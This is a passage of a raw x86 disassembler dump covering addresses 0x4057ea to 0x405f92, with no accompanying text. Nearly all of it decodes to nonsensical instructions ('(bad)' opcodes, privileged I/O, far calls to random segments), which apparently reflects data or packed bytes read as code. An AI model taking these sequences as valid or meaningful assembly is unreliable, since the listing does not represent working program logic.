  4057ea:	jp     0x405825
  4057ec:	in     al,0x94
  4057ee:	pop    esp
  4057ef:	int    0x78
  4057f1:	inc    esi
  4057f2:	pop    es
  4057f3:	dec    esi
  4057f4:	imul   edx,DWORD PTR ds:0xd0421963,0xffffffb1
  4057fb:	lock mov ds,WORD PTR [edx+0x17]
  4057ff:	ins    DWORD PTR es:[edi],dx
  405800:	nop
  405801:	mov    ebp,DWORD PTR [edi]
  405803:	push   ss
  405804:	add    DWORD PTR cs:[edi],esp
  405807:	shl    DWORD PTR [esi+edx*8+0x5dcd6347],1
  40580e:	es (bad) 
  405811:	(bad)  
  405812:	pop    ecx
  405813:	dec    eax
  405814:	sbb    ebx,edx
  405816:	bound  esi,QWORD PTR [eax]
  405818:	xchg   esp,eax
  405819:	cmp    eax,0x64a7035
  40581e:	out    0xb4,eax
  405820:	retf   
  405821:	mov    ch,0x5b
  405823:	bound  ebx,QWORD PTR [edi+0x17]
  405826:	data16 and al,0x1b
  405829:	inc    edx
  40582a:	cmp    al,0xf6
  40582c:	xchg   edx,eax
  40582d:	mov    eax,0x4647e6cb
  405832:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405833:	inc    esi
  405834:	xchg   ebx,eax
  405835:	std    
  405836:	and    al,0x7c
  405838:	pop    eax
  405839:	sahf   
  40583a:	dec    edx
  40583b:	into   
  40583c:	(bad)  
  40583d:	fsub   QWORD PTR [eax+0x77145f66]
  405843:	outs   dx,BYTE PTR ds:[esi]
  405844:	ret    0x6b7e
  405847:	add    BYTE PTR [eax],bl
  405849:	cld    
  40584a:	(bad)  
  40584b:	adc    eax,DWORD PTR [eax-0x6f]
  40584e:	adc    BYTE PTR [esi],0x67
  405851:	adc    al,BYTE PTR [edi+0x49fd5f34]
  405857:	push   ds
  405858:	in     al,0x27
  40585a:	push   0x1da10b79
  40585f:	xor    DWORD PTR [edx+edx*1],0x2
  405863:	or     eax,0x11d3ea85
  405868:	iret   
  405869:	outs   dx,BYTE PTR ds:[esi]
  40586a:	loopne 0x405809
  40586c:	cmp    BYTE PTR [ecx-0x21],bl
  40586f:	in     al,dx
  405870:	inc    ebp
  405871:	(bad)  
  405872:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405873:	adc    ah,BYTE PTR [eax]
  405875:	out    dx,eax
  405876:	lods   al,BYTE PTR ds:[esi]
  405877:	mov    BYTE PTR [ebx],bl
  405879:	mov    esi,0x88bfd981
  40587e:	test   al,0x61
  405880:	adc    BYTE PTR [ebp+0x1a],0x0
  405884:	add    dh,dh
  405886:	sub    DWORD PTR [ecx-0x20ac0d0c],0x11
  40588d:	push   eax
  40588e:	aaa    
  40588f:	or     ch,BYTE PTR [ebx+0x60]
  405892:	xchg   ebp,eax
  405893:	icebp  
  405894:	lock push edx
  405896:	gs dec eax
  405898:	jo     0x405846
  40589a:	je     0x4058a8
  40589c:	mov    eax,ds:0xa06e76f1
  4058a1:	xor    al,BYTE PTR [edx-0x12]
  4058a4:	dec    ecx
  4058a5:	cmp    ah,BYTE PTR [eax-0x74]
  4058a8:	(bad)  
  4058a9:	mov    ds:0xebee9679,eax
  4058ae:	stc    
  4058af:	aaa    
  4058b0:	les    esp,FWORD PTR [ebp-0x76]
  4058b3:	bswap  ecx
  4058b5:	loope  0x405926
  4058b7:	loope  0x4058b5
  4058b9:	(bad)  
  4058ba:	ror    DWORD PTR [ecx+edx*2],cl
  4058bd:	lods   al,BYTE PTR ds:[esi]
  4058be:	and    eax,0x82eb7f81
  4058c3:	jp     0x40589f
  4058c5:	iret   
  4058c6:	sbb    edi,0x51
  4058c9:	loop   0x405865
  4058cb:	retf   0xd1b9
  4058ce:	sbb    eax,0xaba127d9
  4058d3:	mov    esp,0xfd08635e
  4058d8:	and    ebx,DWORD PTR [esi-0x7efff7f6]
  4058de:	xor    esi,ebp
  4058e0:	fimul  WORD PTR [edx-0x764bbc95]
  4058e6:	fild   DWORD PTR [eax]
  4058e8:	(bad)  
  4058e9:	push   eax
  4058ea:	repnz xlat BYTE PTR ds:[ebx]
  4058ec:	adc    eax,edx
  4058ee:	inc    ecx
  4058ef:	out    dx,eax
  4058f0:	addr16 call 0xeacf7825
  4058f6:	jno    0x4058cb
  4058f8:	fdivr  QWORD PTR [eax+0x18]
  4058fb:	and    dh,bl
  4058fd:	add    ah,BYTE PTR [eax+0x16d8356c]
  405903:	popf   
  405904:	in     al,dx
  405905:	dec    ebp
  405906:	xchg   edi,eax
  405907:	mov    bh,0xe5
  405909:	pop    ds
  40590a:	cmp    eax,DWORD PTR [eax+0x5c817453]
  405910:	test   al,0xcb
  405912:	int    0xd0
  405914:	mov    ebx,0x6ecca3b3
  405919:	and    eax,0x7d1e090f
  40591e:	(bad)  
  40591f:	loop   0x40594c
  405921:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405922:	jmp    FWORD PTR [edi+0x5041e1b9]
  405928:	or     edi,esi
  40592a:	ins    BYTE PTR es:[edi],dx
  40592b:	(bad)  
  40592c:	fldcw  WORD PTR [ebp-0x7e78e49b]
  405932:	into   
  405933:	loope  0x405948
  405935:	inc    eax
  405936:	daa    
  405937:	add    bl,BYTE PTR [eax+0x18fbcd05]
  40593d:	shr    BYTE PTR [edi+0x39ccc835],0x98
  405944:	dec    ecx
  405945:	pop    es
  405946:	stos   DWORD PTR es:[edi],eax
  405947:	and    al,0x2f
  405949:	sbb    al,0x8f
  40594b:	rcr    BYTE PTR [eax+0x57],cl
  40594e:	enter  0x90b6,0x2a
  405952:	stc    
  405953:	rol    DWORD PTR [ecx+0x8b34906],0xd7
  40595a:	jmp    0x4059a7
  40595c:	shr    BYTE PTR [edx],1
  40595e:	(bad)  
  40595f:	div    DWORD PTR [esp+eiz*2]
  405962:	lds    ecx,FWORD PTR [edi-0x42bf4f81]
  405968:	fldz   
  40596a:	das    
  40596b:	push   ebx
  40596c:	cld    
  40596d:	mov    esp,0xc3d9ff2c
  405972:	loop   0x405979
  405974:	jae    0x405992
  405976:	fdiv   st,st(5)
  405978:	fimul  DWORD PTR [esi-0x5ddf97ff]
  40597e:	pop    edi
  40597f:	out    dx,al
  405980:	in     eax,dx
  405981:	fwait
  405982:	les    edi,FWORD PTR [ebp+0xf70c84d]
  405988:	xadd   BYTE PTR ds:0x83781be3,dl
  40598f:	jb     0x405a08
  405991:	shr    BYTE PTR gs:[eax+0x57],0xfe
  405996:	mov    ebx,DWORD PTR ds:0xe99e0f1d
  40599c:	xor    al,0xfd
  40599e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40599f:	add    DWORD PTR ss:[edx],ebx
  4059a2:	push   edi
  4059a3:	xlat   BYTE PTR ds:[ebx]
  4059a4:	push   esp
  4059a5:	dec    BYTE PTR [eax+0x5ec13d5e]
  4059ab:	jnp    0x4059b5
  4059ad:	in     eax,0xcf
  4059af:	mov    ch,0x38
  4059b1:	pusha  
  4059b2:	xor    al,0x34
  4059b4:	mov    esp,0x251f2077
  4059b9:	cmp    BYTE PTR ds:0x807ad015,0x9
  4059c0:	sbb    BYTE PTR [edx],ah
  4059c2:	adc    bl,bl
  4059c4:	sbb    eax,0xed8110ca
  4059c9:	or     eax,0xbd500e7b
  4059ce:	sub    DWORD PTR [ebx+0x28],eax
  4059d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059d2:	push   ecx
  4059d3:	cmc    
  4059d4:	adc    BYTE PTR [eax],bl
  4059d6:	cwde   
  4059d7:	xchg   ebp,eax
  4059d8:	outs   dx,DWORD PTR ds:[esi]
  4059d9:	cwde   
  4059da:	and    esi,ebp
  4059dc:	and    BYTE PTR [ebx-0x79],cl
  4059df:	ret    
  4059e0:	dec    edx
  4059e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4059e2:	xor    eax,0xde6a9183
  4059e7:	push   esi
  4059e8:	(bad)  
  4059ea:	in     al,0xf1
  4059ec:	and    edx,edx
  4059ee:	add    ebp,DWORD PTR [ecx+0x1075036b]
  4059f4:	cmp    edx,esi
  4059f6:	jbe    0x4050e3
  4059fc:	pop    ebx
  4059fd:	mov    eax,0xf89c8539
  405a02:	pop    edi
  405a03:	pop    esi
  405a04:	leave  
  405a05:	ret    0xc
  405a08:	push   ebp
  405a09:	mov    ebp,esp
  405a0b:	mov    eax,DWORD PTR [ebp+0xc]
  405a0e:	jmp    0x405cfe
  405a13:	cmp    eax,0xd4d7d0c1
  405a18:	fnstcw WORD PTR ds:0xbbc9f8d9
  405a1e:	jecxz  0x4059f7
  405a20:	pop    ecx
  405a21:	mov    al,0x21
  405a23:	cmp    BYTE PTR [bx+si+0x78],bh
  405a27:	dec    ebp
  405a28:	jle    0x405aa2
  405a2a:	js     0x4059eb
  405a2c:	jmp    0xa6f36a03
  405a31:	add    eax,0xae5501da
  405a36:	or     edi,esi
  405a38:	push   ecx
  405a39:	mov    edi,0x4f227737
  405a3e:	adc    eax,0xa302e49e
  405a43:	test   dl,0xe9
  405a46:	cs loop 0x405a61
  405a49:	lods   eax,DWORD PTR ds:[esi]
  405a4a:	ins    DWORD PTR es:[edi],dx
  405a4b:	mov    ebp,0xbce6dda4
  405a50:	icebp  
  405a51:	aam    0x64
  405a53:	xchg   edx,eax
  405a54:	mov    dh,0x86
  405a56:	repz popa 
  405a58:	popa   
  405a59:	je     0x4059f5
  405a5b:	ja     0x405a61
  405a5d:	loopne 0x405adc
  405a5f:	push   esp
  405a60:	fwait
  405a61:	int3   
  405a62:	or     esi,edx
  405a64:	xchg   edi,eax
  405a65:	or     BYTE PTR [edi-0x3ef1d23],cl
  405a6b:	in     eax,0x33
  405a6d:	sar    DWORD PTR [edx-0x77],0x4b
  405a71:	push   es
  405a72:	push   ebx
  405a73:	scas   eax,DWORD PTR es:[edi]
  405a74:	sahf   
  405a75:	jecxz  0x405aa0
  405a77:	xchg   ebp,eax
  405a78:	inc    edx
  405a79:	xchg   edx,eax
  405a7a:	xchg   ecx,eax
  405a7b:	jmp    0x5cd5c8f1
  405a80:	mov    al,0x58
  405a82:	dec    ebx
  405a83:	leave  
  405a84:	stos   BYTE PTR es:[edi],al
  405a85:	int    0x5b
  405a87:	xor    al,0xfd
  405a89:	xchg   DWORD PTR [ecx],ebx
  405a8b:	sbb    al,0x20
  405a8d:	test   ch,bl
  405a8f:	xor    bl,0x46
  405a92:	out    dx,al
  405a93:	test   BYTE PTR [edx],bh
  405a95:	repnz xchg edi,eax
  405a97:	popf   
  405a98:	jg     0x405af1
  405a9a:	jae    0x405aa2
  405a9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a9d:	outs   dx,DWORD PTR ds:[esi]
  405a9e:	sbb    ebp,DWORD PTR [ebx+0x71217575]
  405aa4:	rcr    BYTE PTR [eax],cl
  405aa6:	xchg   edi,eax
  405aa7:	sbb    ah,dl
  405aa9:	inc    esp
  405aaa:	jmp    0x71aa8765
  405aaf:	movaps xmm0,XMMWORD PTR [esi+0x48d7041a]
  405ab6:	loopne 0x405a7f
  405ab8:	xor    ah,bl
  405aba:	cmp    eax,0xb85d24db
  405abf:	pop    DWORD PTR [eax]
  405ac1:	arpl   WORD PTR [esi-0x30eeaf60],di
  405ac7:	or     DWORD PTR [esi-0x66],ebx
  405aca:	pop    edi
  405acb:	fistp  WORD PTR [eax]
  405acd:	(bad)  
  405ace:	dec    ebp
  405acf:	cmp    eax,0x3d15c577
  405ad4:	inc    esp
  405ad5:	push   ss
  405ad6:	rcl    BYTE PTR [ebp-0x6d],0x12
  405ada:	pop    edi
  405adb:	test   eax,0x34bffc93
  405ae0:	xchg   esp,eax
  405ae1:	sbb    DWORD PTR [edi+0x56],eax
  405ae4:	gs and eax,0x4cf982c9
  405aea:	push   esi
  405aeb:	jns    0x405b39
  405aed:	scas   eax,DWORD PTR es:[edi]
  405aee:	pop    ebx
  405aef:	out    dx,eax
  405af0:	popf   
  405af1:	sbb    edx,esp
  405af3:	cwde   
  405af4:	add    eax,0xf9007166
  405af9:	loope  0x405ac1
  405afb:	mov    ah,ah
  405afd:	cli    
  405afe:	call   0xb699:0x4bf6a4eb
  405b05:	adc    al,ah
  405b07:	ins    DWORD PTR es:[edi],dx
  405b08:	sahf   
  405b09:	in     eax,dx
  405b0a:	jg     0x405b44
  405b0c:	pop    ebp
  405b0d:	xor    BYTE PTR [eax+0x50],ch
  405b10:	lea    ecx,[ecx+esi*1-0x6a]
  405b14:	retf   0x9826
  405b17:	lock jnp 0x405b44
  405b1a:	clc    
  405b1b:	pop    ecx
  405b1c:	rcl    DWORD PTR [ebx+0x48a81ec6],0xec
  405b23:	xor    BYTE PTR [edx+esi*4],dh
  405b26:	ja     0x405b8c
  405b28:	sub    DWORD PTR [ebx],ecx
  405b2a:	mov    ds:0xb05f3df,eax
  405b2f:	jp     0x405bab
  405b31:	scas   eax,DWORD PTR es:[edi]
  405b32:	or     bh,ah
  405b34:	jle    0x405adc
  405b36:	fmul   DWORD PTR [edi+edi*4+0x5b]
  405b3a:	add    DWORD PTR [ebx],0x28
  405b3d:	pop    es
  405b3e:	mov    ebp,DWORD PTR [ebp-0x65]
  405b41:	sbb    edx,DWORD PTR [eax-0x71d0fa68]
  405b47:	lahf   
  405b48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b49:	add    cl,BYTE PTR [edi+ebp*8]
  405b4c:	pop    ds
  405b4d:	bound  esi,QWORD PTR [edi-0x61877502]
  405b53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b54:	inc    edi
  405b55:	test   edi,0x95e61b15
  405b5b:	(bad)  
  405b5c:	mov    edi,0x7d93f1
  405b61:	add    ch,ah
  405b63:	(bad)  
  405b65:	jl     0x405b91
  405b67:	add    al,0xce
  405b69:	ds dec edi
  405b6b:	test   BYTE PTR [ebx+0x4949dcbb],ah
  405b71:	imul   ebx,DWORD PTR [edx-0x7766bf5],0xbbfc6182
  405b7b:	test   al,0xcb
  405b7d:	jbe    0x405ba0
  405b7f:	and    al,0xb9
  405b81:	xchg   DWORD PTR [edx+ebx*1-0x7488d98b],esp
  405b88:	daa    
  405b89:	pop    ds
  405b8a:	into   
  405b8b:	mov    ecx,DWORD PTR [edx+ebx*8]
  405b8e:	mov    eax,ds:0x6abe38cd
  405b93:	hlt    
  405b94:	adc    edi,DWORD PTR [esp+eiz*4]
  405b97:	mov    cl,0xcd
  405b99:	lock mov cl,0xb6
  405b9c:	call   0x2672:0xf5ce493d
  405ba3:	xlat   BYTE PTR ds:[ebx]
  405ba4:	hlt    
  405ba5:	retf   
  405ba6:	cdq    
  405ba7:	retf   
  405ba8:	mov    al,ds:0xf2687f0c
  405bad:	inc    ebp
  405bae:	iret   
  405baf:	gs (bad) 
  405bb1:	mov    esi,0x2ad61181
  405bb6:	push   DWORD PTR [eax-0x10]
  405bb9:	mov    eax,ds:0x1d71a87f
  405bbe:	dec    eax
  405bbf:	push   edx
  405bc0:	add    ecx,DWORD PTR [esi+eiz*4+0x35922f89]
  405bc7:	xchg   ebp,eax
  405bc8:	pop    esi
  405bc9:	shld   ebp,ebp,cl
  405bcc:	(bad)  
  405bcd:	cmp    esi,DWORD PTR [esi-0x75]
  405bd0:	cdq    
  405bd1:	retf   
  405bd2:	aaa    
  405bd3:	int    0x37
  405bd5:	add    esi,esi
  405bd7:	scas   eax,DWORD PTR es:[edi]
  405bd8:	xchg   ecx,eax
  405bd9:	stc    
  405bda:	add    DWORD PTR [ebx],0xffffffb1
  405bdd:	sbb    BYTE PTR [ecx-0x4f],0xa7
  405be1:	rcl    bh,1
  405be3:	dec    ebp
  405be4:	push   esi
  405be5:	scas   al,BYTE PTR es:[edi]
  405be6:	mov    WORD PTR [edx],cs
  405be8:	push   ebp
  405be9:	lods   eax,DWORD PTR ds:[esi]
  405bea:	and    eax,0x99979b2c
  405bef:	fistp  QWORD PTR [ebx+esi*4]
  405bf2:	jp     0x405c3e
  405bf4:	mov    ds:0x6244c517,eax
  405bf9:	xor    DWORD PTR [edi],0x5d94ca26
  405bff:	or     ecx,edi
  405c01:	dec    ebx
  405c02:	js     0x405b98
  405c04:	ja     0x405be8
  405c06:	xchg   edi,eax
  405c07:	adc    DWORD PTR [ebx+0x75fed713],ebp
  405c0d:	fmul   DWORD PTR [esi+0x889c7bd]
  405c13:	in     al,0x5b
  405c15:	jbe    0x405c47
  405c17:	mov    edx,DWORD PTR [ecx-0x66]
  405c1a:	lock pop edi
  405c1c:	push   esi
  405c1d:	push   esp
  405c1e:	std    
  405c1f:	loope  0x405c6c
  405c21:	fimul  WORD PTR [ebx-0x52]
  405c24:	push   0xa206667b
  405c29:	xor    edx,ebp
  405c2b:	dec    ebx
  405c2c:	xchg   edi,eax
  405c2d:	and    al,0x23
  405c2f:	add    BYTE PTR [eax-0x57dc6717],bl
  405c35:	and    al,0xce
  405c37:	cmp    dl,BYTE PTR [eax]
  405c39:	std    
  405c3a:	retf   0xe6e8
  405c3d:	sahf   
  405c3e:	addr16 jp 0x405be4
  405c41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c42:	jns    0x405bf8
  405c44:	and    cl,BYTE PTR [edx]
  405c46:	psubsb mm1,QWORD PTR [ebx-0x57a8b008]
  405c4d:	sub    al,0x65
  405c4f:	fstp   DWORD PTR [ebp-0x1a468d66]
  405c55:	sbb    bl,BYTE PTR [ebp+0x5730723d]
  405c5b:	in     al,dx
  405c5c:	loope  0x405c53
  405c5e:	lahf   
  405c5f:	rol    DWORD PTR [edi],cl
  405c61:	dec    ebp
  405c62:	add    edi,ebp
  405c64:	push   edx
  405c65:	inc    ecx
  405c66:	repnz stos BYTE PTR es:[edi],al
  405c68:	shl    DWORD PTR [edx+eax*4-0x10da42b6],1
  405c6f:	arpl   WORD PTR [ebx-0x9],si
  405c72:	iret   
  405c73:	add    ebx,DWORD PTR [ebx]
  405c75:	aam    0x3c
  405c77:	aam    0xb9
  405c79:	into   
  405c7a:	push   0x567af9e
  405c7f:	mov    edi,0x372730f6
  405c84:	push   ebx
  405c85:	pop    ebx
  405c86:	imul   edx,DWORD PTR [edx+0x12],0x4e
  405c8a:	out    0xbd,eax
  405c8c:	sub    DWORD PTR [ecx+0x64],ebx
  405c8f:	test   al,0x10
  405c91:	dec    ebx
  405c92:	call   0x6e0ff8a7
  405c97:	jge    0x405cbe
  405c99:	loope  0x405ca3
  405c9b:	cli    
  405c9c:	sub    eax,0x569c553d
  405ca1:	bound  edx,QWORD PTR [eax+0x1a]
  405ca4:	bound  edi,QWORD PTR [ebx+0x54]
  405ca7:	iret   
  405ca8:	xchg   ecx,eax
  405ca9:	outs   dx,DWORD PTR ds:[esi]
  405caa:	les    eax,FWORD PTR [ebp+0x15]
  405cad:	add    al,0xb6
  405caf:	push   ecx
  405cb0:	lahf   
  405cb1:	mov    esp,0xd4cbde60
  405cb6:	enter  0xd0e4,0x2b
  405cba:	(bad)  
  405cbb:	sbb    BYTE PTR [esi+0x61],cl
  405cbe:	cli    
  405cbf:	fstp   DWORD PTR [ecx-0x252d6d7a]
  405cc5:	xchg   edx,eax
  405cc6:	fs (bad) 
  405cc8:	(bad)  
  405cc9:	jno    0x405c62
  405ccb:	jmp    0x405d47
  405ccd:	fnstenv [edi]
  405ccf:	jb     0x405d33
  405cd1:	dec    ebp
  405cd2:	xchg   edx,eax
  405cd3:	out    dx,eax
  405cd4:	cmp    dl,0x50
  405cd7:	mov    edx,0x4dfb388b
  405cdc:	syscall 
  405cde:	rol    bh,1
  405ce0:	fsub   QWORD PTR [ebx+0x63]
  405ce3:	fs adc al,0x81
  405ce6:	and    al,0x6e
  405ce8:	xor    cl,BYTE PTR [edx]
  405cea:	ds add al,0xea
  405ced:	rcr    BYTE PTR [eax+0x23],1
  405cf0:	fidiv  DWORD PTR ds:0x69ee9cf3
  405cf7:	adc    BYTE PTR [ebp-0x43],dl
  405cfa:	mov    ebp,0x330ea041
  405cff:	shr    cl,cl
  405d01:	jmp    0x405d05
  405d03:	add    BYTE PTR [eax],al
  405d05:	rol    ebx,1
  405d07:	ror    cl,0xd6
  405d0a:	leave  
  405d0b:	rcr    ebx,1
  405d0d:	aaa    
  405d0e:	mov    eax,0xe4c94c09
  405d13:	mov    esp,0x783db418
  405d18:	js     0x405d67
  405d1a:	jle    0x405d94
  405d1c:	js     0x405d77
  405d1e:	mov    bl,0x40
  405d20:	bound  edi,QWORD PTR [esi+0x7d]
  405d23:	clc    
  405d24:	fdivr  QWORD PTR [ebx]
  405d26:	pushf  
  405d27:	jns    0x405d02
  405d29:	ins    DWORD PTR es:[edi],dx
  405d2a:	(bad)  
  405d2b:	repnz sbb BYTE PTR es:[ebp+0x21],ah
  405d30:	adc    dh,BYTE PTR ds:0xff2e0165
  405d36:	sbb    al,0x4
  405d38:	loop   0x405d11
  405d3a:	dec    esi
  405d3b:	in     al,dx
  405d3c:	jmp    0x3bf5110f
  405d41:	paddusw mm6,QWORD PTR [esi+0x41]
  405d45:	or     edi,edx
  405d47:	sbb    bh,BYTE PTR ss:[ebp+edi*1+0x75955538]
  405d4f:	ins    DWORD PTR es:[edi],dx
  405d50:	out    dx,al
  405d51:	xchg   ebp,eax
  405d52:	sar    BYTE PTR [edx-0x551c0711],0x9d
  405d59:	loope  0x405d92
  405d5b:	js     0x405d1d
  405d5d:	sub    al,0x7f
  405d5f:	enter  0x4a8b,0xff
  405d63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d64:	cwde   
  405d65:	and    DWORD PTR [esi],ebp
  405d67:	cli    
  405d68:	mov    ah,0x68
  405d6a:	mov    esp,0x989e9e8f
  405d6f:	sbb    al,0x85
  405d71:	mov    WORD PTR [edx],?
  405d73:	sahf   
  405d74:	jle    0x405d6d
  405d76:	setg   BYTE PTR [edi]
  405d79:	add    bh,0xe8
  405d7c:	lds    esi,FWORD PTR [esi]
  405d7e:	retf   
  405d7f:	pop    ss
  405d80:	popf   
  405d81:	pop    ecx
  405d82:	mov    al,ds:0xd377d12f
  405d87:	repnz inc ebp
  405d89:	adc    BYTE PTR [eax],ah
  405d8b:	ins    DWORD PTR es:[edi],dx
  405d8c:	dec    BYTE PTR [eax-0x5d7e333a]
  405d92:	popf   
  405d93:	jns    0x405dfc
  405d95:	and    dh,0x50
  405d98:	loope  0x405da1
  405d9a:	mov    ds:0xc2ac9312,eax
  405d9f:	cld    
  405da0:	inc    ecx
  405da1:	or     DWORD PTR [ebx-0xb792b5e],0x1c9d475e
  405dab:	call   0x88d1b14b
  405db0:	push   ss
  405db1:	push   edx
  405db2:	inc    ecx
  405db3:	bound  ecx,QWORD PTR [edi+0x1f267b0b]
  405db9:	inc    ebx
  405dba:	je     0x405d98
  405dbc:	and    BYTE PTR cs:[ecx-0x27787125],0xfa
  405dc4:	mov    bl,0xad
  405dc6:	fsub   QWORD PTR [esi-0x41]
  405dc9:	dec    esp
  405dca:	push   0xb9257dcb
  405dcf:	std    
  405dd0:	and    dh,dh
  405dd2:	adc    ecx,esi
  405dd4:	fadd   st,st(7)
  405dd6:	inc    ebx
  405dd7:	push   0xffffffd2
  405dd9:	imul   esp,DWORD PTR [esi-0x69],0xef8143fc
  405de0:	pop    edi
  405de1:	and    al,0x2b
  405de3:	cmp    ah,BYTE PTR ds:0x608674ab
  405de9:	sti    
  405dea:	in     eax,0xd7
  405dec:	pusha  
  405ded:	jo     0x405dc6
  405def:	fst    QWORD PTR [esi-0x221a761b]
  405df5:	jbe    0x405d85
  405df7:	test   al,0x6d
  405df9:	jg     0x405d97
  405dfb:	jo     0x405df2
  405dfd:	mov    dl,0x23
  405dff:	dec    ecx
  405e00:	inc    ecx
  405e01:	rol    DWORD PTR [ecx-0xe],0xe6
  405e05:	and    eax,0xd9e94166
  405e0a:	pop    esi
  405e0b:	xor    ch,ah
  405e0d:	dec    edi
  405e0e:	xchg   edx,eax
  405e0f:	adc    al,0x5b
  405e11:	ror    BYTE PTR [ecx],0x9c
  405e14:	xchg   BYTE PTR [edx],dl
  405e16:	inc    ecx
  405e17:	shl    DWORD PTR [edx],0x4e
  405e1a:	aam    0x9e
  405e1c:	push   ds
  405e1d:	adc    DWORD PTR [esp+eax*1+0x27],esp
  405e21:	sbb    ecx,DWORD PTR [ecx]
  405e23:	test   BYTE PTR [ecx+0x64],ch
  405e26:	xchg   edx,eax
  405e27:	or     eax,0x233e0030
  405e2c:	and    ah,BYTE PTR ss:[esi+0x47]
  405e30:	xchg   ecx,eax
  405e31:	inc    esp
  405e32:	inc    ebp
  405e33:	add    edi,DWORD PTR [eax]
  405e35:	add    al,0x37
  405e37:	dec    ebx
  405e38:	or     eax,0x1c1c7d49
  405e3d:	cmp    eax,0xdd99c361
  405e42:	mov    esp,0xf49811f8
  405e47:	rcl    esp,0xb0
  405e4a:	enter  0x3471,0x64
  405e4e:	(bad)  
  405e4f:	fs adc eax,0x947362d7
  405e55:	fucomip st,st(3)
  405e57:	xor    DWORD PTR [eax+0x416fc0e5],ecx
  405e5d:	jmp    0x405e72
  405e5f:	iret   
  405e60:	inc    esp
  405e61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e62:	leave  
  405e63:	dec    ebx
  405e64:	mov    esi,0x872d83a1
  405e69:	icebp  
  405e6a:	sbb    edx,DWORD PTR [edi+0x77]
  405e6d:	adc    ah,bh
  405e6f:	xchg   ecx,eax
  405e70:	jo     0x405e0e
  405e72:	xchg   esp,ecx
  405e74:	or     bh,BYTE PTR [ecx-0x7afc34b8]
  405e7a:	dec    eax
  405e7b:	jmp    0xc8e5d44e
  405e80:	or     esi,DWORD PTR [esi]
  405e82:	pop    edi
  405e83:	imul   ecx,DWORD PTR [ebp+0x44511eb0],0xfffffff0
  405e8a:	xor    DWORD PTR [edi+0x1e],0x75
  405e8e:	jle    0x405ef2
  405e90:	and    eax,0xd851e085
  405e95:	fisub  DWORD PTR [ecx+ebp*4]
  405e98:	sar    edi,cl
  405e9a:	(bad)  
  405e9b:	and    BYTE PTR [edx],al
  405e9d:	mov    esp,0x71177230
  405ea2:	cmp    BYTE PTR [edi+0x22fd7c50],ch
  405ea8:	or     cl,BYTE PTR [edx-0x43]
  405eab:	data16 fmul DWORD PTR [edi-0x75]
  405eaf:	fcom   DWORD PTR ds:0x9cd7dbba
  405eb5:	daa    
  405eb6:	cs stos BYTE PTR es:[edi],al
  405eb8:	xchg   ebp,eax
  405eb9:	mov    BYTE PTR [edx-0xe],al
  405ebc:	jne    0x405e76
  405ebe:	pop    edi
  405ebf:	ret    
  405ec0:	mov    DWORD PTR [ecx],esp
  405ec2:	mov    bh,0x61
  405ec4:	cmp    DWORD PTR [edx+0x22],ecx
  405ec7:	and    ebx,edx
  405ec9:	iret   
  405eca:	daa    
  405ecb:	or     al,0x17
  405ecd:	and    DWORD PTR [esi-0x7dfff7fd],edx
  405ed3:	loope  0x405ea3
  405ed5:	in     al,dx
  405ed6:	mov    bl,0x6
  405ed8:	xor    eax,0xb8b37d4a
  405edd:	jge    0x405ed9
  405edf:	clc    
  405ee0:	jmp    0xfb44fd5d
  405ee5:	or     al,0xa6
  405ee7:	or     DWORD PTR [ebx+esi*8-0x28],edx
  405eeb:	popa   
  405eec:	cmc    
  405eed:	adc    dl,BYTE PTR [edx+0x3bf6b64d]
  405ef3:	adc    eax,0x6b35c782
  405ef8:	jecxz  0x405eea
  405efa:	xor    eax,0x19b19f36
  405eff:	aad    0xdb
  405f01:	push   edx
  405f02:	push   esi
  405f03:	iret   
  405f04:	into   
  405f05:	mov    bh,0x6
  405f07:	pusha  
  405f08:	out    0x12,eax
  405f0a:	pop    es
  405f0b:	push   cs
  405f0c:	retf   0xd1b
  405f0f:	sub    ch,BYTE PTR [eax-0x6317f49f]
  405f15:	stos   BYTE PTR es:[edi],al
  405f16:	cli    
  405f17:	pop    esi
  405f18:	mov    ds:0xea8eb27b,al
  405f1d:	les    ebp,FWORD PTR [ecx+0x136b294f]
  405f23:	jb     0x405f84
  405f25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f26:	xlat   BYTE PTR ds:[ebx]
  405f27:	push   ebx
  405f28:	js     0x405ef8
  405f2a:	lfs    eax,FWORD PTR [esi-0x643e3b08]
  405f31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f32:	in     al,dx
  405f33:	xor    edi,DWORD PTR [eax-0x55266b4a]
  405f39:	hlt    
  405f3a:	aam    0x7b
  405f3c:	pop    eax
  405f3d:	add    ebp,DWORD PTR [ebp+0x54]
  405f40:	mov    al,es:0x681bf0f8
  405f46:	sub    eax,0x6a7e6bb1
  405f4b:	cmp    eax,DWORD PTR ss:[esp+ebp*2+0xd785c98]
  405f53:	in     al,0xb4
  405f55:	sub    BYTE PTR [esi+0x65535f85],0xd8
  405f5c:	jae    0x405ee9
  405f5e:	shl    BYTE PTR [ebx-0x568a5ac4],1
  405f64:	pop    es
  405f65:	add    dl,ch
  405f67:	cmp    eax,DWORD PTR [ebx]
  405f69:	retf   0xf20c
  405f6c:	xchg   ebp,eax
  405f6d:	cmp    eax,0x8a6152e4
  405f72:	adc    bh,bh
  405f74:	and    ecx,DWORD PTR [ebp+0x18]
  405f77:	or     eax,0x94cba45f
  405f7c:	push   ebp
  405f7d:	mov    cl,0x86
  405f7f:	outs   dx,BYTE PTR ds:[esi]
  405f80:	xor    BYTE PTR [edx-0x21],dh
  405f83:	lods   al,BYTE PTR ds:[esi]
  405f84:	add    al,0x93
  405f86:	push   esp
  405f87:	leave  
  405f88:	ds xchg ebp,eax
  405f8a:	cmp    BYTE PTR [edi],al
  405f8c:	sbb    bl,BYTE PTR [edi-0x3b]
  405f8f:	shr    DWORD PTR [ecx],cl
  405f91:	daa    
  405f92:	mov    ah,0x2
